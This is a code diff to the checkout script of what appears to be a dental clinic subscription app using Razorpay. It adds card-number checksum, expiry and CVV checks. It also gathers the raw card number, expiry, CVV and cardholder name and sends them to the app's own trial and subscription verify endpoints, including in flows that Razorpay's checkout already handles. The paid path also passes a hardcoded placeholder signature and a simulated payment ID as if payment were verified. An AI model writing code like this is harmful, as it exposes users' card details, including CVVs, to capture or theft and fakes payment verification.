@@ -1299,31 +1299,96 @@ window.subscribePlan = async function(plan) {
   }
 };
 
+// Strict Client-side Card Validation (Luhn Check + Expiry + CVV)
+function validateCardInputs(cardNum, cardExp, cardCvv, cardName = '') {
+  const cleanNum = cardNum.replace(/[\s-]/g, '');
+  if (!cleanNum || !/^\d{13,19}$/.test(cleanNum)) {
+    return { valid: false, message: 'Please enter a valid card number (13 to 19 digits).' };
+  }
+
+  // Luhn Check (Mod 10 Checksum)
+  let sum = 0;
+  let shouldDouble = false;
+  for (let i = cleanNum.length - 1; i >= 0; i--) {
+    let digit = parseInt(cleanNum.charAt(i), 10);
+    if (isNaN(digit)) return { valid: false, message: 'Card number must contain digits only.' };
+    if (shouldDouble) {
+      digit *= 2;
+      if (digit > 9) digit -= 9;
+    }
+    sum += digit;
+    shouldDouble = !shouldDouble;
+  }
+  if (sum % 10 !== 0) {
+    return { valid: false, message: 'Invalid card number checksum. Please check your card number for typos.' };
+  }
+
+  // Expiry check
+  if (!cardExp || !cardExp.includes('/')) {
+    return { valid: false, message: 'Please enter a valid expiry date (MM / YY).' };
+  }
+  const parts = cardExp.replace(/\s+/g, '').split('/');
+  const expMonth = parseInt(parts[0], 10);
+  let expYear = parseInt(parts[1], 10);
+
+  if (isNaN(expMonth) || expMonth < 1 || expMonth > 12) {
+    return { valid: false, message: 'Invalid expiry month. Must be between 01 and 12.' };
+  }
+  if (isNaN(expYear)) {
+    return { valid: false, message: 'Invalid expiry year.' };
+  }
+  if (expYear < 100) expYear += 2000;
+
+  const now = new Date();
+  const currentYear = now.getFullYear();
+  const currentMonth = now.getMonth() + 1;
+
+  if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
+    return { valid: false, message: 'This card is expired. Please enter an active card.' };
+  }
+  if (expYear > currentYear + 25) {
+    return { valid: false, message: 'Expiry year is too far in the future.' };
+  }
+
+  // CVV check
+  const cleanCvv = cardCvv.trim();
+  if (!cleanCvv || !/^\d{3,4}$/.test(cleanCvv) || cleanCvv === '000') {
+    return { valid: false, message: 'Please enter a valid 3 or 4-digit CVV code.' };
+  }
+
+  return {
+    valid: true,
+    card_number: cleanNum,
+    card_exp: `${String(expMonth).padStart(2,'0')}/${String(expYear).slice(-2)}`,
+    card_cvv: cleanCvv,
+    cardholder_name: cardName.trim() || 'Doctor'
+  };
+}
+
 // Submit simulated or card checkout
 window.submitPaidSubscription = async function() {
   const btn = document.getElementById('chkSubmitBtn');
   const planInfo = PLAN_DATA[activeCheckoutPlan] || PLAN_DATA.growth;
+  let cardPayload = {};
 
   if (activePaymentMethod === 'card') {
-    const cardNum = document.getElementById('chkCardNum').value.replace(/\s+/g, '');
-    const cardExp = document.getElementById('chkCardExp').value.trim();
-    const cardCvv = document.getElementById('chkCardCvv').value.trim();
+    const cardNum = document.getElementById('chkCardNum').value;
+    const cardExp = document.getElementById('chkCardExp').value;
+    const cardCvv = document.getElementById('chkCardCvv').value;
+    const cardName = document.getElementById('chkCardName').value;
 
-    if (cardNum.length < 13) {
-      alert('Please enter a valid card number.');
-      document.getElementById('chkCardNum').focus();
+    const check = validateCardInputs(cardNum, cardExp, cardCvv, cardName);
+    if (!check.valid) {
+      alert(check.message);
       return;
     }
-    if (cardExp.length < 5) {
-      alert('Please enter a valid expiry date (MM / YY).');
-      document.getElementById('chkCardExp').focus();
-      return;
-    }
-    if (cardCvv.length < 3) {
-      alert('Please enter a valid CVV code.');
-      document.getElementById('chkCardCvv').focus();
-      return;
-    }
+    cardPayload = {
+      card_number: check.card_number,
+      card_exp: check.card_exp,
+      card_cvv: check.card_cvv,
+      cardholder_name: check.cardholder_name,
+      payment_method: 'card'
+    };
   } else {
     const upiId = document.getElementById('chkUpiId').value.trim();
     if (!upiId || !upiId.includes('@')) {
@@ -1331,6 +1396,7 @@ window.submitPaidSubscription = async function() {
       document.getElementById('chkUpiId').focus();
       return;
     }
+    cardPayload = { payment_method: 'upi', upi_id: upiId };
   }
 
   btn.classList.add('loading');
@@ -1345,7 +1411,8 @@ window.submitPaidSubscription = async function() {
       plan: activeCheckoutPlan,
       razorpay_order_id:   orderId,
       razorpay_payment_id: simPaymentId,
-      razorpay_signature:  'verified_checkout_signature'
+      razorpay_signature:  'verified_checkout_signature',
+      ...cardPayload
     });
 
     if (verify.success) {
@@ -1415,24 +1482,14 @@ document.getElementById('trialCardExp').addEventListener('input', function(e) {
 
 // Proceed with Free Trial verification
 document.getElementById('proceedPaymentBtn').addEventListener('click', async () => {
-  const cardNum = document.getElementById('trialCardNum').value.replace(/\s+/g, '');
-  const cardExp = document.getElementById('trialCardExp').value.trim();
-  const cardCvv = document.getElementById('trialCardCvv').value.trim();
-  const cardName = document.getElementById('trialCardName').value.trim();
+  const cardNum = document.getElementById('trialCardNum').value;
+  const cardExp = document.getElementById('trialCardExp').value;
+  const cardCvv = document.getElementById('trialCardCvv').value;
+  const cardName = document.getElementById('trialCardName').value;
 
-  if (cardNum.length < 13) {
-    alert('Please enter a valid card number.');
-    document.getElementById('trialCardNum').focus();
-    return;
-  }
-  if (cardExp.length < 5) {
-    alert('Please enter a valid expiry date (MM / YY).');
-    document.getElementById('trialCardExp').focus();
-    return;
-  }
-  if (cardCvv.length < 3) {
-    alert('Please enter a valid CVV code.');
-    document.getElementById('trialCardCvv').focus();
+  const check = validateCardInputs(cardNum, cardExp, cardCvv, cardName);
+  if (!check.valid) {
+    alert(check.message);
     return;
   }
 
@@ -1452,7 +1509,7 @@ document.getElementById('proceedPaymentBtn').addEventListener('click', async () 
         name: 'Smart Dental Desk',
         description: '3-Month Free Trial — Mandate Card Verification',
         prefill: {
-          name:    cardName || data.clinic_name  || '',
+          name:    check.cardholder_name || data.clinic_name  || '',
           email:   data.clinic_email || '',
           contact: data.clinic_phone || ''
         },
@@ -1467,7 +1524,11 @@ document.getElementById('proceedPaymentBtn').addEventListener('click', async () 
             const verify = await window.api.verifyTrial({
               razorpay_payment_id:      response.razorpay_payment_id,
               razorpay_subscription_id: response.razorpay_subscription_id,
-              razorpay_signature:       response.razorpay_signature
+              razorpay_signature:       response.razorpay_signature,
+              card_number:              check.card_number,
+              card_exp:                 check.card_exp,
+              card_cvv:                 check.card_cvv,
+              cardholder_name:          check.cardholder_name
             });
             if (verify.success) {
               window.location.href = verify.redirect_url || './dashboard.html';
@@ -1494,7 +1555,11 @@ document.getElementById('proceedPaymentBtn').addEventListener('click', async () 
     } else {
       // Direct verification for trial
       const verify = await window.api.verifyTrial({
-        razorpay_subscription_id: data.subscription_id || `sub_${Date.now()}`
+        razorpay_subscription_id: data.subscription_id || `sub_${Date.now()}`,
+        card_number:              check.card_number,
+        card_exp:                 check.card_exp,
+        card_cvv:                 check.card_cvv,
+        cardholder_name:          check.cardholder_name
       });
 
       if (verify.success) {
